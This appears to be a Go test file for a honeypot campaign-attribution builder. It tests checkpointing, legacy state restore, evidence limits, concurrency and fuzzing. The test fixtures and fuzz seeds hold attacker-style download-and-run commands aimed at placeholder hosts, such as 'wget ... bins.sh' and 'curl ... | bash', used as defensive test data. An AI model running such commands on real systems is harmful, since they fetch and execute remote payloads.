	if after.CampaignFingerprint != before["203.0.113.2"].CampaignFingerprint || after.Confidence != before["203.0.113.2"].Confidence {
		t.Fatalf("the open session went from %s/%v to %s/%v when its peer expired",
			before["203.0.113.2"].CampaignFingerprint, before["203.0.113.2"].Confidence, after.CampaignFingerprint, after.Confidence)
	}
	// A third source that shares only the expired session's payload still
	// joins the campaign.
	b.Update(downloadEvent("203.0.113.3", sha))
	if s := sessionsBySource(t, b); s["203.0.113.3"].CampaignFingerprint != after.CampaignFingerprint {
		t.Fatal("evidence of the expired session no longer links its campaign")
	}
	checkCounters(t, b)

	b.inactivityWindow = -time.Hour // everything is expired now
	if flushed := b.FlushExpired(); len(flushed) != 2 {
		t.Fatalf("flushed %d sessions, want the two that were open", len(flushed))
	}
	if len(b.retained) != 0 || b.strongEntries != 0 || b.weakEntries != 0 {
		t.Fatalf("a campaign with no open session still holds %d sources' evidence (%d entries)", len(b.retained), b.strongEntries)
	}
}

// ---- durable checkpoint ----

func sortedSessions(b *TTPBuilder) []*database.TTPSession {
	s := b.GetActiveSessions()
	sort.Slice(s, func(i, j int) bool { return s[i].SessionID < s[j].SessionID })
	return s
}

// A checkpoint holds the whole state: a builder restored from one mid-stream
// ends where the original does, byte for byte.
func TestCheckpointRoundTripMidStream(t *testing.T) {
	events := correlationEvents()
	now := time.Now().UTC()
	// One source's session expires mid-stream, leaving retained evidence.
	gone := makeTTPEvent("203.0.113.99", "wget http://dl.example.net/x")
	gone.Timestamp = now.Add(-3 * time.Hour)
	for i, e := range events {
		e.Timestamp = now.Add(time.Duration(i-len(events)) * time.Second)
	}
	events = append([]*database.Event{gone}, events...)

	for _, split := range []int{0, 1, 9, 20, 30, len(events)} {
		original := NewTTPBuilder(time.Hour)
		for _, e := range events[:split] {
			original.Update(e)
		}
		if split >= 30 {
			if flushed := original.FlushExpired(); len(flushed) != 1 {
				t.Fatalf("split %d: flushed %d sessions, want the one old session", split, len(flushed))
			}
			if len(original.retained) != 1 {
				t.Fatalf("split %d: %d sources' evidence retained, want 1", split, len(original.retained))
			}
		}
		state, err := original.checkpoint()
		if err != nil {
			t.Fatal(err)
		}
		restored := NewTTPBuilder(time.Hour)
		if err := restored.restoreCheckpoint(state); err != nil {
			t.Fatalf("split %d: %v", split, err)
		}
		checkCounters(t, restored)
		if again, err := restored.checkpoint(); err != nil || !bytes.Equal(again, state) {
			t.Fatalf("split %d: a restored checkpoint encodes differently (%v):\n%s\n%s", split, err, state, again)
		}
		for _, e := range events[split:] {
			original.Update(e)
			restored.Update(e)
		}
		if !reflect.DeepEqual(sortedSessions(original), sortedSessions(restored)) {
			t.Fatalf("split %d: sessions differ after a restore:\n%s\n%s", split, correlationResult(original), correlationResult(restored))
		}
		a, errA := original.checkpoint()
		c, errC := restored.checkpoint()
		if errA != nil || errC != nil || !bytes.Equal(a, c) {
			t.Fatalf("split %d: final state differs after a restore (%v, %v)", split, errA, errC)
		}
		var format struct {
			Format int `json:"format"`
		}
		if err := json.Unmarshal(a, &format); err != nil || format.Format != checkpointFormat {
			t.Fatalf("checkpoint format %d (%v), want %d", format.Format, err, checkpointFormat)
		}
	}
}

// Honeypot names and address zones are stored as they came, bytes that are
// not UTF-8 included: a restore must not merge "pot\xff" with "pot�".
func TestCheckpointKeepsBinaryIdentity(t *testing.T) {
	events := []*database.Event{
		{Honeypot: "pot\xff", EventType: "command", Command: "id"},
		{Honeypot: "pot�", EventType: "command", Command: "id"},
		{Honeypot: "cowrie", SourceIP: "fe80::1%\xff", EventType: "command", Command: "id"},
	}
	b := NewTTPBuilder(time.Hour)
	for i, e := range events {
		b.Update(at(i, e))
	}
	state, err := b.checkpoint()
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.Contains(state, []byte("_qpot_encoding")) {
		t.Fatalf("a checkpoint with non-UTF-8 strings was stored as plain JSON: %s", state)
	}
	restored := NewTTPBuilder(time.Hour)
	if err := restored.restoreCheckpoint(state); err != nil {
		t.Fatal(err)
	}
	if !reflect.DeepEqual(sortedSessions(b), sortedSessions(restored)) || len(restored.sessions) != 3 {
		t.Fatalf("sessions changed in the checkpoint:\n%+v\n%+v", sortedSessions(b), sortedSessions(restored))
	}
	for _, e := range events {
		if _, isNew := restored.Update(e); isNew {
			t.Fatalf("after a restore the event of honeypot %q, source %q opened a new session", e.Honeypot, e.SourceIP)
		}
	}
	if got := restored.sessions["fe80::/64"].session.SourceIPs; !reflect.DeepEqual(got, []string{"fe80::1%\xff"}) {
		t.Fatalf("restored source IPs %q", got)
	}
}

// legacyCheckpoint is the checkpoint the builder wrote before sessions were
// keyed by source: a bare map of fingerprint to accumulator.
func legacyCheckpoint(t *testing.T, lastSeen time.Time, sourceIP string) []byte {
	t.Helper()
	type oldSession struct {
		Session   *database.TTPSession `json:"session"`
		Usernames map[string]bool      `json:"usernames"`
		Tools     map[string]bool      `json:"tools"`
		Stems     map[string]bool      `json:"stems"`
		Honeypots map[string]bool      `json:"honeypots"`
		IPs       map[string]bool      `json:"ips"`
		LastSeen  time.Time            `json:"last_seen"`
	}
	state := map[string]oldSession{
		"9f3a1c07": {
			Session: &database.TTPSession{
				SessionID: "9f3a1c07-1767268800000000000", CampaignFingerprint: "9f3a1c07",
				SourceIPs: []string{"198.51.100.4", sourceIP}, SharedInfrastructure: true,
				KillChainStages: []string{"execution"}, Techniques: []string{"T1059.004", "T1105"},
				EventCount: 23, FirstSeen: lastSeen.Add(-10 * time.Minute), LastSeen: lastSeen, Confidence: 0.73,
			},
			Usernames: map[string]bool{"root": true}, Tools: map[string]bool{"c2.example.com": true, "Wget/1.21": true},
			Stems: map[string]bool{"wget": true}, Honeypots: map[string]bool{"cowrie": true},
			IPs: map[string]bool{"198.51.100.4": true, sourceIP: true}, LastSeen: lastSeen,
		},
		"0badc0de": {
			Session: &database.TTPSession{SessionID: "0badc0de-1767268800000000001", CampaignFingerprint: "0badc0de",
				SourceIPs: []string{"203.0.113.77"}, EventCount: 1, FirstSeen: lastSeen, LastSeen: lastSeen, Confidence: 0.51},
			Usernames: map[string]bool{}, Tools: map[string]bool{}, Stems: map[string]bool{"uname": true},
			Honeypots: map[string]bool{"cowrie": true}, IPs: map[string]bool{"203.0.113.77": true}, LastSeen: lastSeen,
		},
	}
	data, err := durablejson.Marshal(state)
	if err != nil {
		t.Fatal(err)
	}
	return data
}

// A checkpoint written before the upgrade restores. Its sessions keep their
// stored ID, fingerprint and confidence, take no new events, survive a new
// checkpoint, and leave by expiring.
func TestRestoreLegacyCheckpoint(t *testing.T) {
	// "\xff" makes durablejson wrap the checkpoint in its base64 envelope,
	// as it does for a source address that is not valid UTF-8.
	for _, sourceIP := range []string{"203.0.113.1", "203.0.113.1\xff"} {
		lastSeen := time.Now().UTC().Add(-10 * time.Minute).Truncate(time.Millisecond)
		b := NewTTPBuilder(time.Hour)
		if err := b.restoreCheckpoint(legacyCheckpoint(t, lastSeen, sourceIP)); err != nil {
			t.Fatalf("restoring a pre-upgrade checkpoint: %v", err)
		}
		find := func(id string) *database.TTPSession {
			for _, s := range b.GetActiveSessions() {
				if s.SessionID == id {
					return s
				}
			}
			return nil
		}
		old := find("9f3a1c07-1767268800000000000")
		if old == nil || len(b.GetActiveSessions()) != 2 {
			t.Fatalf("restored sessions %v, want both stored ones", b.GetActiveSessions())
		}
		want := *old
		if old.CampaignFingerprint != "9f3a1c07" || old.Confidence != 0.73 || !old.SharedInfrastructure || old.EventCount != 23 ||
			!reflect.DeepEqual(old.SourceIPs, []string{"198.51.100.4", sourceIP}) || !old.LastSeen.Equal(lastSeen) {
			t.Fatalf("restored session changed: %+v", old)
		}

		// Its source's next event opens a session of its own.
		if _, isNew := b.Update(makeTTPEvent("198.51.100.4", "wget http://c2.example.com/x")); !isNew {
			t.Fatal("an event joined a pre-upgrade session")
		}
		if got := find(want.SessionID); !reflect.DeepEqual(*got, want) {
			t.Fatalf("a new event changed the pre-upgrade session:\n%+v\n%+v", want, *got)
		}

		// It is carried through checkpoints in the new format.
		state, err := b.checkpoint()
		if err != nil {
			t.Fatal(err)
		}
		b = NewTTPBuilder(time.Hour)
		if err := b.restoreCheckpoint(state); err != nil {
			t.Fatal(err)
		}
		if got := find(want.SessionID); got == nil || !reflect.DeepEqual(*got, want) {
			t.Fatalf("pre-upgrade session after a second restore:\n%+v\n%+v", want, got)
		}
		if _, isNew := b.Update(makeTTPEvent("198.51.100.4", "id")); isNew {
			t.Fatal("the new session did not survive the checkpoint")
		}

		// It leaves by expiring, handed back like any other.
		b.inactivityWindow = 5 * time.Minute
		flushed := b.FlushExpired()
		if len(flushed) != 2 || find(want.SessionID) != nil {
			t.Fatalf("flushed %d sessions, want the two pre-upgrade ones", len(flushed))
		}
		for _, s := range flushed {
			if len(s.CampaignFingerprint) != 8 {
				t.Fatalf("flushed %+v, want a pre-upgrade session", s)
			}
		}
		if len(b.GetActiveSessions()) != 1 {
			t.Fatal("the new session should still be open")
		}
		checkCounters(t, b)
	}
}

func TestRestoreCheckpointRejectsBadState(t *testing.T) {
	for name, data := range map[string]string{
		"not JSON":                   `{"format":`,
		"legacy fingerprint differs": `{"9f3a1c07":{"session":{"session_id":"x-1","campaign_fingerprint":"00000000"},"last_seen":"2026-01-01T00:00:00Z"}}`,
		"legacy without a session":   `{"9f3a1c07":{"last_seen":"2026-01-01T00:00:00Z"}}`,
		"legacy without an ID":       `{"9f3a1c07":{"session":{"campaign_fingerprint":"9f3a1c07"}}}`,
		"a later format":             `{"format":2,"sessions":{}}`,
		"session without an ID":      `{"format":1,"sessions":{"203.0.113.1":{"session":{"session_id":""}}}}`,
		"session missing":            `{"format":1,"sessions":{"203.0.113.1":{}}}`,
	} {
		b := NewTTPBuilder(time.Hour)
		b.Update(makeTTPEvent("203.0.113.1", "id"))
		if err := b.restoreCheckpoint([]byte(data)); err == nil {
			t.Errorf("%s: restored without error", name)
		}
		if len(b.GetActiveSessions()) != 1 {
			t.Errorf("%s: a rejected checkpoint changed the builder", name)
		}
	}
	// No checkpoint, and an empty one, are an empty builder.
	for _, data := range []string{"", "null", "{}", `{"format":1}`} {
		b := NewTTPBuilder(time.Hour)
		b.Update(makeTTPEvent("203.0.113.1", "id"))
		if err := b.restoreCheckpoint([]byte(data)); err != nil || len(b.GetActiveSessions()) != 0 {
			t.Errorf("%q: err=%v, %d sessions; want an empty builder", data, err, len(b.GetActiveSessions()))
		}
	}
	// Evidence lists longer than the limits, or unsorted, are cut back and a
	// malformed key cannot break attribution.
	var long []string
	for i := 0; i < 3*maxSessionEvidence; i++ {
		long = append(long, fmt.Sprintf(`{"key":"h:%04d","at":"2026-01-01T00:00:%02dZ"}`, i, 59-i%60))
	}
	data := `{"format":1,"sessions":{"203.0.113.1":{"session":{"session_id":"s-1","source_ips":["b","a","a"]},
		"evidence":[{"key":"","at":"2026-01-01T00:00:00Z"},{"key":"x","at":"2026-01-01T00:00:00Z"},` + strings.Join(long, ",") + `],
		"weak":["z","y","x","w","v","u","t","s","r","q"]},
		"203.0.113.2":{"session":{"session_id":"s-2"},"evidence":[{"key":"x","at":"2026-01-01T00:00:00Z"}]}},
		"retained":{"203.0.113.3":{"strong":[]},"203.0.113.4":null}}`
	b := NewTTPBuilder(time.Hour)
	if err := b.restoreCheckpoint([]byte(data)); err != nil {
		t.Fatal(err)
	}
	s := b.sessions["203.0.113.1"]
	if len(s.evidence) != maxSessionEvidence || len(s.weak) != maxSessionWeak || !sort.StringsAreSorted(s.weak) ||
		!sort.SliceIsSorted(s.evidence, func(i, j int) bool { return earlier(s.evidence[i], s.evidence[j]) }) {
		t.Fatalf("restored lists not cut back to their limits: %d evidence, %d weak", len(s.evidence), len(s.weak))
	}
	if !reflect.DeepEqual(s.session.SourceIPs, []string{"a", "b"}) {
		t.Fatalf("restored source IPs %v, want them sorted and unique", s.session.SourceIPs)
	}
	got := sessionsBySource(t, b)
	if got["a,b"].CampaignFingerprint != got["s-2"].CampaignFingerprint || len(b.retained) != 0 {
		t.Fatalf("restored sessions %v, retained %d", got, len(b.retained))
	}
	checkCounters(t, b)
}

// ---- bounds ----

// One session keeps the earliest maxSessionEvidence hosts and payloads,
// maxSessionWeak weak keys and sequenceCommands commands, in any order.
func TestSessionEvidenceBounded(t *testing.T) {
	var events []*database.Event
	for i := 0; i < 4*maxSessionEvidence; i++ {
		events = append(events, at(i, makeTTPEvent("203.0.113.1", fmt.Sprintf("wget http://h%d.example.net/x; echo %d", i, i))))
		events = append(events, at(i, loginEvent("203.0.113.1", fmt.Sprintf("user%d", i), "pw", fmt.Sprintf("agent/%d", i))))
	}
	var want *sessionState
	for seed := int64(0); seed < 5; seed++ {
		b := NewTTPBuilder(time.Hour)
		order := append([]*database.Event(nil), events...)
		if seed > 0 {
			rand.New(rand.NewSource(seed)).Shuffle(len(order), func(i, j int) { order[i], order[j] = order[j], order[i] })
		}
		for _, e := range order {
			b.Update(e)
		}
		s := b.sessions["203.0.113.1"]
		if len(s.evidence) != maxSessionEvidence || len(s.commands) != sequenceCommands || len(s.weak) != maxSessionWeak {
			t.Fatalf("session holds %d evidence, %d commands, %d weak keys", len(s.evidence), len(s.commands), len(s.weak))
		}
		checkCounters(t, b)
		if want == nil {
			want = s
			// In time order the earliest are the first ones.
			if s.evidence[0].Key != kindHost+hash128(domainHost, "h0.example.net") || !s.evidence[maxSessionEvidence-1].At.Equal(ttpEpoch.Add((maxSessionEvidence-1)*time.Second)) {
				t.Fatalf("kept evidence is not the earliest: %v", s.evidence)
			}
		} else if !reflect.DeepEqual(s.evidence, want.evidence) || !reflect.DeepEqual(s.commands, want.commands) || !reflect.DeepEqual(s.weak, want.weak) {
			t.Fatalf("seed %d: the kept evidence depends on arrival order", seed)
		}
	}
}

// The addresses of one /64 a session lists are bounded, sorted and unique,
// and the same whatever order they arrive in.
func TestSessionIPsBounded(t *testing.T) {
	b, reversed := NewTTPBuilder(time.Hour), NewTTPBuilder(time.Hour)
	const n = maxSessionIPs + 500
	for i := 0; i < n; i++ {
		b.Update(makeTTPEvent(fmt.Sprintf("2001:db8::%x", i+1), "id"))
		reversed.Update(makeTTPEvent(fmt.Sprintf("2001:db8::%x", n-i), "id"))
	}
	s, r := b.GetActiveSessions(), reversed.GetActiveSessions()
	if len(s) != 1 || len(s[0].SourceIPs) != maxSessionIPs || s[0].EventCount != n {
		t.Fatalf("%d sessions, %d source IPs, want 1 session with %d", len(s), len(s[0].SourceIPs), maxSessionIPs)
	}
	for i := 1; i < len(s[0].SourceIPs); i++ {
		if s[0].SourceIPs[i-1] >= s[0].SourceIPs[i] {
			t.Fatal("source IPs not sorted and unique")
		}
	}
	if !reflect.DeepEqual(s[0].SourceIPs, r[0].SourceIPs) {
		t.Fatal("the listed source IPs depend on arrival order")
	}
}

// Evidence across all sessions is bounded: past the limit sources are still
// tracked but record no more, and expiry frees the room again.
func TestTotalEvidenceBounded(t *testing.T) {
	b := NewTTPBuilder(time.Hour)
	b.maxEvidence, b.maxWeak, b.maxSessions = 60, 40, 50
	old := time.Now().UTC().Add(-2 * time.Hour)
	for i := 0; i < 400; i++ {
		ip := fmt.Sprintf("203.0.%d.%d", 113+i/250, i%250+1)
		for j := 0; j < 3; j++ {
			e := makeTTPEvent(ip, fmt.Sprintf("wget http://h%d-%d.example.net/x", i, j))
			e.Username, e.Password = fmt.Sprintf("u%d", i), fmt.Sprintf("p%d", j)
			if i < 100 {
				e.Timestamp = old.Add(time.Duration(i) * time.Second) // these expire
			}
			b.Update(e)
			checkCounters(t, b)
		}
	}
	if len(b.sessions) != 400 || b.strongEntries != 60 || b.weakEntries != 40 {
		t.Fatalf("%d sessions holding %d strong and %d weak entries, want 400 sessions at the limits 60 and 40",
			len(b.sessions), b.strongEntries, b.weakEntries)
	}
	if n := len(b.GetActiveSessions()); n != 400 {
		t.Fatalf("%d sessions resolved, want 400", n)
	}

	// The flush expires the 100 old sessions and closes the longest-quiet of
	// the rest down to the session limit.
	flushed := b.FlushExpired()
	if len(flushed) != 350 || len(b.sessions) != 50 {
		t.Fatalf("flushed %d sessions leaving %d, want 350 leaving the limit of 50", len(flushed), len(b.sessions))
	}
	checkCounters(t, b)
	if b.retainedStrong != 0 {
		t.Fatalf("%d retained entries for campaigns with no open session", b.retainedStrong)
	}
	// With room again, new evidence is recorded.
	b.Update(makeTTPEvent("198.51.100.1", "wget http://later.example.net/x"))
	if len(b.sessions["198.51.100.1"].evidence) != 1 {
		t.Fatal("no evidence recorded after expiry freed room")
	}
	checkCounters(t, b)
}

// Retained evidence is bounded too: it may use half the evidence limit, the
// oldest going first, so one long campaign cannot crowd out open sessions.
func TestRetainedEvidenceBounded(t *testing.T) {
	b := NewTTPBuilder(time.Hour)
	b.maxWeak = 16
	old := time.Now().UTC().Add(-2 * time.Hour)
	// One campaign: every source fetches from the same host.
	for i := 0; i < 100; i++ {
		e := makeTTPEvent(fmt.Sprintf("203.0.113.%d", i+1), "wget http://198.51.100.9/a.sh")
		e.Timestamp = old.Add(time.Duration(i) * time.Second)
		e.Username, e.Password = "root", fmt.Sprint(i)
		b.Update(e)
	}
	b.Update(makeTTPEvent("198.51.100.200", "wget http://198.51.100.9/a.sh")) // keeps the campaign open
	open := sessionsBySource(t, b)["198.51.100.200"]
	b.maxEvidence = 40 // the 100 expiring sessions' evidence does not fit in half of it
	if flushed := b.FlushExpired(); len(flushed) != 100 {
		t.Fatalf("flushed %d sessions, want 100", len(flushed))
	}
	checkCounters(t, b)
	if b.retainedStrong == 0 || b.retainedStrong > b.maxEvidence/2 || b.retainedWeak > b.maxWeak/2 {
		t.Fatalf("retained %d strong and %d weak entries, limits %d and %d", b.retainedStrong, b.retainedWeak, b.maxEvidence/2, b.maxWeak/2)
	}
	// The newest are the ones kept.
	if b.retained["203.0.113.100"] == nil || b.retained["203.0.113.1"] != nil {
		t.Fatal("retained evidence was not trimmed oldest first")
	}
	after := sessionsBySource(t, b)["198.51.100.200"]
	if after.CampaignFingerprint != open.CampaignFingerprint || after.Confidence != open.Confidence {
		t.Fatalf("the open session went from %s/%v to %s/%v", open.CampaignFingerprint, open.Confidence, after.CampaignFingerprint, after.Confidence)
	}
}

// ---- concurrency stress ----

func TestTTPBuilderConcurrent(t *testing.T) {
	b := NewTTPBuilder(30 * time.Minute)
	const goroutines = 20
	const events = 100
	var wg sync.WaitGroup
	wg.Add(goroutines)
	for g := 0; g < goroutines; g++ {
		g := g
		go func() {
			defer wg.Done()
			for i := 0; i < events; i++ {
				// Use varied commands to create realistic spread of campaigns.
				cmd := fmt.Sprintf("wget http://c2-%d.example.com/payload", g%5)
				ev := makeTTPEvent(fmt.Sprintf("203.0.113.%d", g+1), cmd)
				b.Update(ev)
				if i%10 == 0 {
					b.GetActiveSessions()
					b.FlushExpired()
					if _, err := b.checkpoint(); err != nil {
						t.Error(err)
					}
				}
			}
		}()
	}
	wg.Wait()

	sessions := b.GetActiveSessions()
	campaigns := map[string]bool{}
	for _, s := range sessions {
		campaigns[s.CampaignFingerprint] = true
	}
	if len(sessions) != goroutines || len(campaigns) != 5 {
		t.Errorf("%d sessions in %d campaigns, want %d sources in 5 campaigns", len(sessions), len(campaigns), goroutines)
	}
}

// A campaign many bots share (one dropper URL, thousands of addresses) is one
// session per bot under one fingerprint. An update must cost the same on a
// builder tracking that campaign as on an empty one: linking is not done per
// event.
func TestTTPUpdateCostDoesNotGrowWithCampaign(t *testing.T) {
	b := NewTTPBuilder(time.Hour)
	ev := func(ip string) *database.Event {
		return &database.Event{Honeypot: "cowrie", EventType: "command", SourceIP: ip,
			Command: "cd /tmp; wget http://198.51.100.9/bins.sh", Timestamp: time.Now().UTC()}
	}
	for i := 0; i < 20000; i++ {
		b.Update(ev(fmt.Sprintf("10.%d.%d.%d", i>>16&255, i>>8&255, i&255)))
	}
	small := NewTTPBuilder(time.Hour)
	small.Update(ev("10.0.0.1"))
	repeats := func(bld *TTPBuilder) uint64 {
		var before, after runtime.MemStats
		runtime.GC()
		runtime.ReadMemStats(&before)
		for i := 0; i < 200; i++ {
			bld.Update(ev("10.0.0.1")) // repeat sightings
		}
		runtime.ReadMemStats(&after)
		return after.TotalAlloc - before.TotalAlloc
	}
	// The same sightings must cost about the same on a 1-source and a
	// 20000-source campaign (a ratio, so the race detector's overhead does
	// not matter).
	oneSource, bigCampaign := repeats(small), repeats(b)
	if bigCampaign > 2*oneSource+(1<<20) {
		t.Fatalf("200 repeat sightings allocated %d KiB on a 20000-source campaign, %d KiB on a 1-source one",
			bigCampaign>>10, oneSource>>10)
	}
	s := b.GetActiveSessions()
	campaigns := map[string]bool{}
	var total int64
	for _, x := range s {
		campaigns[x.CampaignFingerprint] = true
		total += x.EventCount
		if len(x.SourceIPs) != 1 || x.Confidence != 0.85 {
			t.Fatalf("session %+v: want one source at confidence 0.85", x)
		}
	}
	if len(s) != 20000 || len(campaigns) != 1 || total != 20200 {
		t.Fatalf("%d sessions in %d campaigns with %d events, want 20000 in 1 with 20200", len(s), len(campaigns), total)
	}
	checkCounters(t, b)
}

// ---- fuzzing ----

// checkBuilderInvariants fails when the builder's sessions break what must
// always hold, whatever the input.
func checkBuilderInvariants(t *testing.T, b *TTPBuilder, maxSessions int) {
	t.Helper()
	sessions := b.GetActiveSessions()
	if len(sessions) > maxSessions {
		t.Fatalf("%d sessions for %d distinct sources", len(sessions), maxSessions)
	}
	ids := map[string]bool{}
	for _, s := range sessions {
		if s.Confidence < 0 || s.Confidence > 1 {
			t.Fatalf("confidence %v out of range", s.Confidence)
		}
		if len(s.CampaignFingerprint) != 32 || strings.Trim(s.CampaignFingerprint, "0123456789abcdef") != "" {
			t.Fatalf("campaign fingerprint %q is not 128 bits of hex", s.CampaignFingerprint)
		}
		if ids[s.SessionID] || s.SessionID == "" {
			t.Fatalf("session ID %q empty or used twice", s.SessionID)
		}
		ids[s.SessionID] = true
		if s.EventCount < 1 || s.LastSeen.Before(s.FirstSeen) {
			t.Fatalf("session %+v: no events, or last_seen before first_seen", s)
		}
		for i := 1; i < len(s.SourceIPs); i++ {
			if s.SourceIPs[i-1] >= s.SourceIPs[i] {
				t.Fatalf("source IPs not sorted and unique: %q", s.SourceIPs)
			}
		}
	}
	checkCounters(t, b)
}

// FuzzTTPBuilder drives the campaign builder with attacker-controlled
// commands, user agents, usernames and source addresses. It must never panic,
// must attribute an event the same way every time, and must keep each
// session's derived fields consistent.
func FuzzTTPBuilder(f *testing.F) {
	f.Add("wget http://a.example@203.0.113.9/x.sh; sh x.sh", "Wget/1.21", "root", "203.0.113.1", int64(0))
	f.Add("curl HXXPS://bad[.]example/b | bash", "", "admin", "2001:db8::1", int64(-3600))
	f.Add("", "", "", "", int64(1<<40))
	f.Add("\x00\xff http://[::1]:22/ http://0x7f.1/", "\xff", "\x00", "not-an-ip", int64(-1<<40))
	f.Fuzz(func(t *testing.T, cmd, ua, user, ip string, offset int64) {
		ev := &database.Event{
			Honeypot: "cowrie", SourceIP: ip, EventType: "command", Command: cmd, Username: user, Password: user,
			Metadata:  map[string]string{"user_agent": ua, "shasum": cmd},
			Timestamp: time.Unix(1_800_000_000+offset%(1<<33), 0).UTC(),
		}
		bld, twin := NewTTPBuilder(time.Hour), NewTTPBuilder(time.Hour)
		for i := 0; i < 3; i++ {
			id, isNew := bld.Update(ev)
			twinID, _ := twin.Update(ev)
			if id != twinID || isNew != (i == 0) {
				t.Fatalf("update %d: session %q (new=%v), a second builder says %q", i, id, isNew, twinID)
			}
			s := bld.GetActiveSessions()
			if len(s) != 1 || s[0].EventCount != int64(i+1) || s[0].SessionID != id {
				t.Fatalf("after %d updates: sessions %+v", i+1, s)
			}
		}
		checkBuilderInvariants(t, bld, 1)
		if a, b := bld.GetActiveSessions()[0], twin.GetActiveSessions()[0]; !reflect.DeepEqual(a, b) {
			t.Fatalf("the same events attributed differently:\n%+v\n%+v", a, b)
		}
		// One source alone shares nothing with anyone.
		if c := bld.GetActiveSessions()[0].Confidence; c != confidenceSingleSource && c != confidenceSharedSource && c != confidenceUnknownSource {
			t.Fatalf("confidence %v for a source on its own", c)
		}
		_ = bld.FlushExpired()
	})
}

// FuzzTTPUpdate feeds the builder several events with arbitrary commands and
// source addresses, through a checkpoint. It must not panic, must keep at most
// one session per distinct source, and must restore to the same state.
func FuzzTTPUpdate(f *testing.F) {
	f.Add("uname -a", "203.0.113.1", "uname -a", "203.0.113.2", "wget http://198.51.100.9/a", "203.0.113.1", uint8(0))
	f.Add("wget http://c2.example/x", "2001:db8::1", "curl http://c2.example/y", "2001:db8::2", "id", "::ffff:52.1.2.3", uint8(3))
	f.Add("a\nb", "", "\xff", "0.0.0.0", "http://[::1", "fe80::1%eth0", uint8(77))
	f.Add("x", "1.2.3.4", "x", "1.2.3.4 ", "x", "01.2.3.4", uint8(255))
	f.Fuzz(func(t *testing.T, cmd1, ip1, cmd2, ip2, cmd3, ip3 string, shape uint8) {
		cmds, ips := []string{cmd1, cmd2, cmd3}, []string{ip1, ip2, ip3}
		types := []string{"command", "cowrie.command.input", "cowrie.session.file_download", "cowrie.login.failed"}
		distinct := map[string]bool{}
		b := NewTTPBuilder(time.Hour)
		for i := 0; i < 12; i++ {
			k := (i + int(shape)) % 3
			e := &database.Event{
				Honeypot: "cowrie", SourceIP: ips[k], EventType: types[(i+int(shape>>2))%len(types)],
				Command: cmds[(i*5+int(shape>>4))%3], Payload: []byte(cmds[k]), Username: cmds[k], Password: ips[k],
				Metadata:  map[string]string{"user_agent": cmds[(k+1)%3], "shasum": strings.Repeat("0123456789abcdef", 4)},
				Timestamp: time.Unix(1_700_000_000+int64(shape)*int64(i%5), int64(i)).UTC(),
			}
			distinct[ips[k]] = true
			b.Update(e)
			if i == 5 {
				state, err := b.checkpoint()
				if err != nil {
					t.Fatalf("checkpoint: %v", err)
				}
				restored := NewTTPBuilder(time.Hour)
				if err := restored.restoreCheckpoint(state); err != nil {
					t.Fatalf("restore: %v", err)
				}
				if again, err := restored.checkpoint(); err != nil || !bytes.Equal(state, again) {
					t.Fatalf("a restored checkpoint encodes differently (%v):\n%s\n%s", err, state, again)
				}
				b = restored
			}
		}
		checkBuilderInvariants(t, b, len(distinct))
		b.inactivityWindow = -time.Hour
		if flushed := b.FlushExpired(); len(flushed) == 0 || len(b.sessions) != 0 || len(b.retained) != 0 || b.strongEntries != 0 || b.weakEntries != 0 {
			t.Fatalf("flushing everything left %d sessions, %d retained, %d+%d entries", len(b.sessions), len(b.retained), b.strongEntries, b.weakEntries)
		}
	})
}
